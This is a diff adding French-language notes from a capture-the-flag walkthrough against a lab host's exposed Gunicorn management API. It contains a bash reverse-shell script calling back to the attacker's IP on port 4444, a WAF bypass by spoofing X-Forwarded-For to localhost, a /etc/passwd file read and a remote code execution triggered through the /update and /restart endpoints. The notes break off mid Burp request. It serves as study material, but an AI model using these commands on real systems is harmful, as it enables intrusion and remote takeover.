@@ -1,0 +1,157 @@
+# nmap -sV 192.168.57.134   
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 13:39 +0000
+Nmap scan report for 192.168.57.134
+Host is up (0.00035s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Etant donné que nous sommes dans un contexte de CTF Exposed API, essayons
+
+# nmap -p- -sV 192.168.57.134
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+13337/tcp open  http    Gunicorn 20.0.4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service Gunicorn sur le port 13337 en tcp
+voyons ce qu'il y a derrière 
+curl -i http://192.168.57.134:13337/ > gunicorn.html
+
+Nous avons une page qui nous informes que la configuration identifié ne devrait pas être expose
+et on voit des return
+GET : /version
+GET : /restart
+GET : /logs
+POST : /update 
+Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"} 
+Semble mettre à jour l'app à partir d'un executable
+
+Essyaons d'exploiter le /update avec un shell
+
+écrire dans le shell.sh
+cat > shell.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.49.57/4444 0>&1
+EOF
+
+chmod +x shell.sh
+
+On va ensuite héberger notre fichier
+
+python3 -m http.server 8000
+nc -lvnp 4444
+
+??# curl -X POST http://192.168.57.134:13337/update \
+  -H "Content-Type: application/json" \
+  -d '{"user":"kali","url":"http://192.168.49.57:8000/shell.sh"}'
+Invalid username. 
+
+Ok modifions avec Gunicorn
+regardons les logs pour trouver un user
+
+# curl http://192.168.57.134:13337/logs
+WAF: Access Denied for this Host.
+
+Essayons avec localhost
+curl http://192.168.57.134:13337/logs \
+  -H "Host: localhost"
+WAF: Access Denied for this Host.
+
+# curl http://192.168.57.134:13337/logs \
+  -H "Host: localhost" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1"
+Error! No file specified. Use file=/path/to/log/file to access log files.    
+
+Ok on a bypass le WAF en se faisant passer pour le localhost dans le XFF
+
+curl "http://192.168.57.134:13337/logs?file=/etc/passwd" \
+  -H "Host: localhost" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1"
+
+<html>
+    <head>
+        <title>Remote Software Management API</title>
+        <link rel="stylesheet" href="static/style.css"
+    </head>
+    <body>
+        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
+        <br>
+        <br>
+        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
+        <br>
+        <br>
+        <div class="divmain">
+            <h3>Log:</h3>
+            <div class="divmin">
+            root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
+            </div>
+        </div>
+    </body>
+
+
+Jackpot, on voit le user : clumsyadmin
+
+# curl -X POST http://192.168.57.134:13337/update \
+  -H "Content-Type: application/json" \
+  -d '{"user":"clumsyadmin","url":"http://192.168.49.57:8000/shell.sh"}'
+Update requested by clumsyadmin. Restart the software for changes to take effect. 
+
+Sur mon server http 
+192.168.57.134 - - [11/Mar/2026 14:35:59] "GET /shell.sh HTTP/1.1" 200 -
+
+On restart
+
+curl http://192.168.57.134:13337/restart \
+  -H "Host: localhost" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1"
+
+
+/bin/bash -c "bash -i >& /dev/tcp/192.168.49.57/4444 0>&1
+
+en soit si on a réussi a avoir /etc/passwd on peut essayé de récup d'autre information
+
+on passe sur burpsuite
+
+GET /logs?file=/etc/passwd HTTP/1.1
+Host: localhost
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+X-Forwarded-For: 127.0.0.1                           
+X-Real-IP: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 2
